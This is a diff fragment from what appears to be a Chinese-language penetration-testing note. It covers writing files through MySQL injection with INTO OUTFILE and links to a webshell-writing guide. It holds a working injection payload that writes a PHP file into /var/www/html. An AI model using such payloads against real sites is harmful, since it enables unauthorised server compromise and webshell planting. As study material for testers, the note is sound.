@@ -53,7 +53,7 @@ sqlmap写文件为空原因在于查询结果为空所以结尾也没有添加�
 ```
 //输入参数如下，前面查询的语句省略，这是where后的语句
 //后面是字段拼接字符和行拼接字符
-admin' or 'a'='a' LIMIT 0,1 INTO OUTFILE '/var/www/html/re.php' FIELDS TERMINATED BY '-'  LINES TERMINATED BY '<?phpinfo();?>';
+admin' or 'a'='a' LIMIT 0,1 INTO OUTFILE '/var/www/html/re.php' FIELDS TERMINATED BY '-'  LINES TERMINATED BY '<?phpinfo();?>'---
 ```
 
 其它写webshell方法:[Mysql写入Webshell](https://www.cnblogs.com/xuyangda/p/14510562.html)
